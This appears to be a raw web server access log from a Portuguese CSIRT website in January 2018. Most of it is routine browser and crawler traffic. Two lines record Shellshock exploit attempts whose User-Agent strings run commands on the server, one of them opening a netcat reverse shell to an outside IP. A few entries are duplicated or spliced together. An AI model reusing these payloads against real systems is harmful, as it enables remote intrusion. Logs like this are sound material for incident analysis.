81.193.56.148 - - [21/Jan/2018:09:24:05 +0000] "GET /index.php/rede-nacional-csirt/33-rede-nacional-csirt/rede-macional-csirt?format=feed&type=rss HTTP/1.1" 200 657 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
81.193.56.148 - - [21/Jan/2018:09:25:05 +0000] "GET /index.php/rede-nacional-csirt/33-rede-nacional-csirt/rede-macional-csirt?format=feed&type=rss HTTP/1.1" 200 657 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/602.4.8 (KHTML, like Gecko) Version/10.0.3 Safari/602.4.8"
81.193.56.148 - - [21/Jan/2018:09:27:05 +0000] "GET /index.php/rede-nacional-csirt/33-rede-nacional-csirt/rede-macional-csirt?format=feed&type=rss HTTP/1.1" 200 657 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
81.193.56.148 - - [21/Jan/2018:09:30:05 +0000] "GET /index.php/rede-nacional-csirt/33-rede-nacional-csirt/rede-macional2-csirt?format=feed&type=rss HTTP/1.1" 200 657 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0"
35.224.32.195 - - [21/Jan/2018:09:35:05 +0000] "GET / HTTP/1.1" 200 13833 "-" "ltx71 - (http://ltx71.com/)"
185.105.48.2 - - [21/Jan/2018:09:39:18 +0000] "GET / HTTP/1.1" 200 13833 "-" "check_http/v2.2.1 (gurustuff-plugins 2.1)"
66.249.66.143 - - [21/Jan/2018:09:39:47 +0000] "GET / HTTP/1.1" 200 13927 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
35.224.32.195 - - [21/Jan/2018:09:40:06 +0000] "GET /robots.txt HTTP/1.1" 200 865 "-" "ltx71 - (http://ltx71.com/)"
185.105.48.2 - - [21/Jan/2018:09:44:18 +0000] "GET / HTTP/1.1" 200 13833 "-" "check_http/v2.2.1 (gurustuff-plugins 2.1)"
103.208.246.235 - - [21/Jan/2018:09:45:29 +0000] "GET / HTTP/1.1" 200 13833 "http://linhaalerta.internetsegura.pt" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
197.235.108.4 - - [21/Jan/2018:12:22:09 +0000] "GET /templates/beez_20/css/layout.css HTTP/1.1" 200 30158 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
197.235.108.4 - - [21/Jan/2018:12:22:09 +0000] "GET /templates/beez_20/css/general.css HTTP/1.1" 200 4143 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
197.235.108.4 - - [21/Jan/2018:12:22:09 +0000] "GET /plugins/content/attachments/attachments_refresh.js HTTP/1.1" 200 1835 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
197.235.108.4 - - [21/Jan/2018:12:22:09 +0000] "GET /media/system/js/mootools-core.js HTTP/1.1" 200 96362 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
197.235.108.4 - - [21/Jan/2018:12:22:09 +0000] "GET /images/membrorede.jpg HTTP/1.1" 200 13448 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
197.235.108.4 - - [21/Jan/2018:12:22:09 +0000] "GET /images/cert_rcts_cor-1.png HTTP/1.1" 200 27466 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
197.235.108.4 - - [21/Jan/2018:12:22:09 +0000] "GET /templates/beez_20/javascript/md_stylechanger.js HTTP/1.1" 200 2104 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
197.235.108.4 - - [21/Jan/2018:12:22:09 +0000] "GET /templates/beez_20/javascript/hide.js HTTP/1.1" 200 8145 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
197.235.108.4 - - [21/Jan/2018:12:22:09 +0000] "GET /images/TI-Certified_120x120.jpg HTTP/1.1" 200 7510 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
197.235.108.4 - - [21/Jan/2018:12:22:09 +0000] "GET /templates/system/css/system.css HTTP/1.1" 200 896 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
144.64.54.113 - - [21/Jan/2018:12:27:42 +0000] "GET /templates/beez_20/css/position.css HTTP/1.1" 200 6277 "http://www.cert.rcts.pt/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
144.64.54.113 - - [21/Jan/2018:12:27:42 +0000] "GET /templates/beez_20/css/layout.css HTTP/1.1" 200 30158 "http://www.cert.rcts.pt/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
144.64.54.113 - - [21/Jan/2018:12:27:42 +0000] "GET /templates/beez_20/css/nature.css HTTP/1.1" 200 19417 "http://www.cert.rcts.pt/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
144.64.54.113 - - [21/Jan/2018:12:27:42 +0000] "GET /media/system/js/mootools-core.js HTTP/1.1" 200 96362 "http://www.cert.rcts.pt/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
144.64.54.113 - - [21/Jan/2018:12:27:42 +0000] "GET /media/system/js/caption.js HTTP/1.1" 200 729 "http://www.cert.rcts.pt/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
144.64.54.113 - - [21/Jan/2018:12:27:42 +0000] "GET /media/system/js/core.js HTTP/1.1" 200 4784 "http://www.cert.rcts.pt/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
144.64.54.113 - - [21/Jan/2018:12:27:42 +0000] "GET /plugins/content/attachments/attachments_refresh.js HTTP/1.1" 200 1835 "http://www.cert.rcts.pt/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
144.64.54.113 - - [21/Jan/2018:12:27:42 +0000] "GET /templates/beez_20/javascript/md_stylechanger.js HTTP/1.1" 200 2104 "http://www.cert.rcts.pt/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
144.64.54.113 - - [21/Jan/2018:12:27:42 +0000] "GET /media/system/css/system.css HTTP/1.1" 200 1446 "http://www.cert.rcts.pt/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
144.64.54.113 - - [21/Jan/2018:12:27:42 +0000] "GET /templates/beez_20/javascript/hide.js HTTP/1.1" 200 8145 "http://www.cert.rcts.pt/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
216.244.66.196 - - [21/Jan/2018:12:49:34 +0000] "GET /index.php/servicos/tratamento-de-incidentes/14-institucional/1742-comunicado-de-imprensa HTTP/1.1" 200 12378 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.196 - - [21/Jan/2018:12:49:38 +0000] "GET /index.php/servicos/tratamento-de-incidentes/20-institucional/relatorios-de-actividades/1460-relMar%C3%A7o2009 HTTP/1.1" 200 10367 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.196 - - [21/Jan/2018:12:49:57 +0000] "GET /index.php/rede-nacional-csirt/documentos/1489-classificacao-de-incidentes?tmpl=component&print=1&page= HTTP/1.1" 200 4501 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.196 - - [21/Jan/2018:12:50:06 +0000] "GET /index.php/rede-nacional-csirt/34-rede-nacional-csirt/documentos-rede-nacional-csirt HTTP/1.1" 200 18783 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.196 - - [21/Jan/2018:12:50:13 +0000] "GET /index.php/rede-nacional-csirt/documentos/1489-classificacao-de-incidentes HTTP/1.1" 200 11235 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
176.79.3.228 - - [21/Jan/2018:13:19:42 +0000] "GET /plugins/content/attachments/attachments1.css HTTP/1.1" 200 77 "http://www.cert.rcts.pt/index.php/rede-nacional-csirt" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
176.79.3.228 - - [21/Jan/2018:13:19:42 +0000] "GET /plugins/content/attachments/attachments.css HTTP/1.1" 200 6226 "http://www.cert.rcts.pt/index.php/rede-nacional-csirt" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
176.79.3.228 - - [21/Jan/2018:13:19:42 +0000] "GET /templates/system/css/system.css HTTP/1.1" 200 896 "http://www.cert.rcts.pt/index.php/rede-nacional-csirt" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
176.79.3.228 - - [21/Jan/2018:13:19:42 +0000] "GET /templates/beez_20/css/layout.css HTTP/1.1" 200 30158 "http://www.cert.rcts.pt/index.php/rede-nacional-csirt" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
176.79.3.228 - - [21/Jan/2018:13:19:42 +0000] "GET /images/membrorede.jpg HTTP/1.1" 200 13448 "http://www.cert.rcts.pt/index.php/rede-nacional-csirt" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
176.79.3.228 - - [21/Jan/2018:13:19:42 +0000] "GET /media/system/images/printButton.png HTTP/1.1" 200 228 "http://www.cert.rcts.pt/index.php/rede-nacional-csirt" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
176.79.3.228 - - [21/Jan/2018:13:19:42 +0000] "GET /images/logo_republica_portuguesa_CTES.png HTTP/1.1" 200 9236 "http://www.cert.rcts.pt/index.php/rede-nacional-csirt" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
176.79.3.228 - - [21/Jan/2018:13:19:42 +0000] "GET /templates/beez_20/fonts/TitilliumMaps29L002.otf HTTP/1.1" 200 47984 "http://www.cert.rcts.pt/templates/beez_20/css/nature.css" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
176.79.3.228 - - [21/Jan/2018:13:19:42 +0000] "GET /images/logo-fccn_201701.png HTTP/1.1" 200 10121 "http://www.cert.rcts.pt/index.php/rede-nacional-csirt" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
176.79.3.228 - - [21/Jan/2018:13:19:42 +0000] "GET /templates/beez_20/images/nature/header11.jpg HTTP/1.1" 404 324 "http://www.cert.rcts.pt/templates/beez_20/css/nature.css" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
23.237.4.26 - - [21/Jan/2018:15:16:06 +0000] "GET /images/docs/RFC2350RCTSCERT.pdf HTTP/1.1" 200 839177 "-" "Mozilla/5.0 (compatible; AlphaBot/3.2; +http://alphaseobot.com/bot.html)"
23.237.4.26 - - [21/Jan/2018:15:16:12 +0000] "GET /index.php/institucional/contactos HTTP/1.1" 404 6227 "-" "Mozilla/5.0 (compatible; AlphaBot/3.2; +http://alphaseobot.com/bot.html)"
23.237.4.26 - - [21/Jan/2018:15:16:15 +0000] "GET /images/docs/Taxonomiav2.5.pdf HTTP/1.1" 200 1335362 "-" "Mozilla/5.0 (compatible; AlphaBot/3.2; +http://alphaseobot.com/bot.html)"
23.237.4.26 - - [21/Jan/2018:15:16:22 +0000] "GET /images/docs/Taxonomiav2.5.pdf HTTP/1.1" 200 1335362 "-" "Mozilla/5.0 (compatible; AlphaBot/3.2; +http://alphaseobot.com/bot.html)"
66.249.66.129 - - [21/Jan/2018:17:37:29 +0000] "GET / HTTP/1.1" 200 13828 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
85.244.232.85 - - [21/Jan/2018:18:01:02 +0000] "GET /images/cert_rcts_cor-1.png HTTP/1.1" 200 27466 "http://www.cert.rcts.pt/index.php/rede-nacional-csirt" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
85.244.232.85 - - [21/Jan/2018:18:01:02 +0000] "GET /templates/beez_20/images/system/arrow.png HTTP/1.1" 200 159 "http://www.cert.rcts.pt/index.php/rede-nacional-csirt" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
85.244.232.85 - - [21/Jan/2018:18:01:02 +0000] "GET /images/TI-Certified_120x120.jpg HTTP/1.1" 200 7510 "http://www.cert.rcts.pt/index.php/rede-nacional-csirt" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
85.244.232.85 - - [21/Jan/2018:18:01:02 +0000] "GET /images/first-logo-home.png HTTP/1.1" 200 2290 "http://www.cert.rcts.pt/index.php/rede-nacional-csirt" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
85.244.232.85 - - [21/Jan/2018:18:01:02 +0000] "GET /templates/beez_20/fonts/TitilliumMaps29L002.otf HTTP/1.1" 200 47984 "http://www.cert.rcts.pt/templates/beez_20/css/nature.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
85.244.232.85 - - [21/Jan/2018:18:01:02 +0000] "GET /images/membrorede.jpg HTTP/1.1" 200 13448 "http://www.cert.rcts.pt/index.php/rede-nacional-csirt" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
85.244.232.85 - - [21/Jan/2018:18:01:02 +0000] "GET /media/system/images/printButton.png HTTP/1.1" 200 228 "http://www.cert.rcts.pt/index.php/rede-nacional-csirt" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
157.55.39.75 - - [21/Jan/2018:21:41:35 +0000] "GET /index.php/servicos/tratamento-de-incidentes/14-institucional HTTP/1.1" 200 21280 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Ma185.105.48.2 - - [21/Jan/2018:21:44:18 +0000] "GET / HTTP/1.1" 200 13833 "-" "check_http/v2.2.1 (gurustuff-plugins 2.1)"
71.6.202.198 - - [21/Jan/2018:21:46:41 +0000] "GET /ccvv HTTP/1.1" 404 281 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64)"
157.55.39.75 - - [21/Jan/2018:21:41:35 +0000] "GET /index.php/servicos/tratamento-de-incidentes/14-institucional HTTP/1.1" 200 21280 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
185.105.48.2 - - [21/Jan/2018:21:44:18 +0000] "GET / HTTP/1.1" 200 13833 "-" "check_http/v2.2.1 (gurustuff-plugins 2.1)"
71.6.202.198 - - [21/Jan/2018:21:46:41 +0000] "GET /ccvv HTTP/1.1" 404 281 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64)"
35.224.32.195 - - [22/Jan/2018:02:34:10 +0000] "GET /index.php/institucional/contactos HTTP/1.1" 404 6130 "-" "ltx71 - (http://ltx71.com/)"
185.105.48.2 - - [22/Jan/2018:02:34:18 +0000] "GET / HTTP/1.1" 200 13833 "-" "check_http/v2.2.1 (gurustuff-plugins 2.1)"
185.105.48.2 - - [22/Jan/2018:02:39:18 +0000] "GET / HTTP/1.1" 200 13833 "-" "check_http/v2.2.1 (gurustuff-plugins 2.1)"
37.9.113.80 - - [22/Jan/2018:02:41:59 +0000] "GET /robots.txt HTTP/1.1" 200 865 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
87.250.224.105 - - [22/Jan/2018:02:42:00 +0000] "GET /robots.txt HTTP/1.1" 200 865 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
37.9.113.80 - - [22/Jan/2018:02:42:00 +0000] "GET /robots.txt HTTP/1.1" 200 865 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
153.146.50.240 - - [22/Jan/2018:04:57:53 +0000] "GET /plugins/content/attachments/attachments1.css HTTP/1.1" 200 77 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
153.146.50.240 - - [22/Jan/2018:04:57:53 +0000] "GET /plugins/content/attachments/attachments.css HTTP/1.1" 200 6226 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
153.146.50.240 - - [22/Jan/2018:04:57:53 +0000] "GET /templates/system/css/system.css HTTP/1.1" 200 896 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
153.146.50.240 - - [22/Jan/2018:04:57:54 +0000] "GET /templates/beez_20/css/position.css HTTP/1.1" 200 6277 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
153.146.50.240 - - [22/Jan/2018:04:57:54 +0000] "GET /templates/beez_20/css/general.css HTTP/1.1" 200 4143 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
153.146.50.240 - - [22/Jan/2018:04:57:54 +0000] "GET /templates/beez_20/css/nature.css HTTP/1.1" 200 19417 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
35.224.32.195 - - [22/Jan/2018:05:03:59 +0000] "GET /index.php/servicos/tratamento-de-incidentes/15-institucional/missao HTTP/1.1" 200 17971 "-" "ltx71 - (http://ltx71.com/)"
185.105.48.2 - - [22/Jan/2018:05:04:18 +0000] "GET / HTTP/1.1" 200 13833 "-" "check_http/v2.2.1 (gurustuff-plugins 2.1)"
35.224.32.195 - - [22/Jan/2018:05:06:21 +0000] "GET /index.php/servicos/tratamento-de-incidentes/16-institucional/contactos HTTP/1.1" 200 14035 "-" "ltx71 - (http://ltx71.com/)"
35.224.32.195 - - [22/Jan/2018:05:06:38 +0000] "GET /media/system/js/mootools-core.js HTTP/1.1" 200 96362 "-" "ltx71 - (http://ltx71.com/)"
17.142.159.185 - - [22/Jan/2018:05:08:57 +0000] "GET /?tmpl=component&print=1&page= HTTP/1.1" 200 7500 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)"
193.126.83.136 - - [22/Jan/2018:10:33:33 +0000] "GET /templates/beez_20/css/print.css HTTP/1.1" 200 5174 "http://www.cert.rcts.pt/index.php/servicos/tratamento-de-incidentes" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; SRS Coimbra; rv:11.0) like Gecko"
193.126.83.136 - - [22/Jan/2018:10:33:33 +0000] "GET /templates/beez_20/css/position.css HTTP/1.1" 200 6277 "http://www.cert.rcts.pt/index.php/servicos/tratamento-de-incidentes" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; SRS Coimbra; rv:11.0) like Gecko"
193.126.83.136 - - [22/Jan/2018:10:33:33 +0000] "GET /templates/beez_20/css/layout.css HTTP/1.1" 200 30158 "http://www.cert.rcts.pt/index.php/servicos/tratamento-de-incidentes" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; SRS Coimbra; rv:11.0) like Gecko"
193.126.83.136 - - [22/Jan/2018:10:33:33 +0000] "GET /media/system/js/mootools-core.js HTTP/1.1" 200 96362 "http://www.cert.rcts.pt/index.php/servicos/tratamento-de-incidentes" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; SRS Coimbra; rv:11.0) like Gecko"
193.126.83.136 - - [22/Jan/2018:10:33:33 +0000] "GET /templates/beez_20/css/general_mozilla.css HTTP/1.1" 200 200 "http://www.cert.rcts.pt/index.php/servicos/tratamento-de-incidentes" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; SRS Coimbra; rv:11.0) like Gecko"
193.126.83.136 - - [22/Jan/2018:10:33:33 +0000] "GET /templates/beez_20/css/general.css HTTP/1.1" 200 4143 "http://www.cert.rcts.pt/index.php/servicos/tratamento-de-incidentes" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; SRS Coimbra; rv:11.0) like Gecko"
193.126.83.136 - - [22/Jan/2018:10:33:33 +0000] "GET /templates/beez_20/css/nature.css HTTP/1.1" 200 19417 "http://www.cert.rcts.pt/index.php/servicos/tratamento-de-incidentes" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; SRS Coimbra; rv:11.0) like Gecko"
193.126.83.136 - - [22/Jan/2018:10:33:33 +0000] "GET /media/system/js/core.js HTTP/1.1" 200 4784 "http://www.cert.rcts.pt/index.php/servicos/tratamento-de-incidentes" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; SRS Coimbra; rv:11.0) like Gecko"
193.126.83.136 - - [22/Jan/2018:10:33:33 +0000] "GET /media/system/js/caption.js HTTP/1.1" 200 729 "http://www.cert.rcts.pt/index.php/servicos/tratamento-de-incidentes" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; SRS Coimbra; rv:11.0) like Gecko"
193.126.83.136 - - [22/Jan/2018:10:33:34 +0000] "GET /templates/beez_20/images/nature/box1.png HTTP/1.1" 200 157 "http://www.cert.rcts.pt/index.php/servicos/tratamento-de-incidentes" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; SRS Coimbra; rv:11.0) like Gecko"
193.126.83.136 - - [22/Jan/2018:10:33:34 +0000] "GET /templates/beez_20/images/nature/header11.jpg HTTP/1.1" 404 324 "http://www.cert.rcts.pt/index.php/servicos/tratamento-de-incidentes" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; SRS Coimbra; rv:11.0) like Gecko"
193.126.83.136 - - [22/Jan/2018:10:33:34 +0000] "GET /templates/beez_20/images/nature/karo.gif HTTP/1.1" 200 45 "http://www.cert.rcts.pt/index.php/servicos/tratamento-de-incidentes" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; SRS Coimbra; rv:11.0) like Gecko"
193.126.83.136 - - [22/Jan/2018:10:33:34 +0000] "GET /templates/beez_20/fonts/TitilliumMaps29L002.otf HTTP/1.1" 200 47984 "http://www.cert.rcts.pt/index.php/servicos/tratamento-de-incidentes" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; SRS Coimbra; rv:11.0) like Gecko"
193.126.83.136 - - [22/Jan/2018:10:33:34 +0000] "GET /templates/beez_20/images/nav_level_1.gif HTTP/1.1" 200 223 "http://www.cert.rcts.pt/index.php/servicos/tratamento-de-incidentes" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; SRS Coimbra; rv:11.0) like Gecko"
195.169.55.85 - - [22/Jan/2018:10:34:00 +0100] "GET /cgi-bin/testing.cgi HTTP/1.0" 200 1 "-" "() { :;}; /bin/bash -c 'ping -c 3 191.252.134.38; id'"
195.169.55.85 - - [22/Jan/2018:10:35:12 +0100] "GET /cgi-bin/testing.cgi HTTP/1.0" 200 1 "-" "() { :;}; /bin/bash -c 'nc 191.252.134.38 4444 -e /bin/sh'"
123.130.94.161 - - [22/Jan/2018:16:29:24 +0000] "GET /plugins/content/attachments/attachments_refresh.js HTTP/1.1" 200 1835 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
123.130.94.161 - - [22/Jan/2018:16:29:24 +0000] "GET /templates/beez_20/javascript/md_stylechanger.js HTTP/1.1" 200 2104 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
123.130.94.161 - - [22/Jan/2018:16:29:24 +0000] "GET /media/system/js/mootools-more.js HTTP/1.1" 200 238331 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
123.130.94.161 - - [22/Jan/2018:16:29:24 +0000] "GET /templates/beez_20/javascript/hide.js HTTP/1.1" 200 8145 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
123.130.94.161 - - [22/Jan/2018:16:29:24 +0000] "GET /media/system/css/system.css HTTP/1.1" 200 1446 "http://www.cert.rcts.pt/templates/system/css/system.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
123.130.94.161 - - [22/Jan/2018:16:29:24 +0000] "GET /images/TI-Certified_120x120.jpg HTTP/1.1" 200 7510 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
123.130.94.161 - - [22/Jan/2018:16:29:24 +0000] "GET /images/first-logo-home.png HTTP/1.1" 200 2290 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
123.130.94.161 - - [22/Jan/2018:16:29:24 +0000] "GET /images/cert_rcts_cor-1.png HTTP/1.1" 200 27466 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
123.130.94.161 - - [22/Jan/2018:16:29:24 +0000] "GET /images/membrorede.jpg HTTP/1.1" 200 13448 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
123.130.94.161 - - [22/Jan/2018:16:29:24 +0000] "GET /media/system/images/printButton.png HTTP/1.1" 200 228 "http://www.cert.rcts.pt/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
